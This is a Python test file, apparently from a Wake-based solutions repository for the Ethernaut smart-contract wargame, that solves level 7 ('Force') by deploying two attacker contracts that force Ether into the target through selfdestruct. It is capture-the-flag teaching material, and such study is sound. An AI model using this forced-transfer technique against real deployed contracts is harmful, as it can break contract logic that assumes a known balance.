from wake.testing import *
from tests.ethernaut_deployer import EthernautDeployer
from pytypes.contracts.lv07_force import Force
from pytypes.contracts.attacker.lv07_transfer import ForceTransfer, FasterForceTransfer

@default_chain.connect()
def test_level_07():
    service = EthernautDeployer(default_chain)
    contract = service.deploy_lv07()
    do_level_07_solution(contract)
    service.check_lv07(contract)

def do_level_07_solution(contract: Force):
    # Problem: Selfdestruct and minting transfer Ether directly 
    attacker1 = ForceTransfer.deploy()
    attacker1.push(contract, value=30)
    attacker2 = FasterForceTransfer.deploy(contract, value=100)
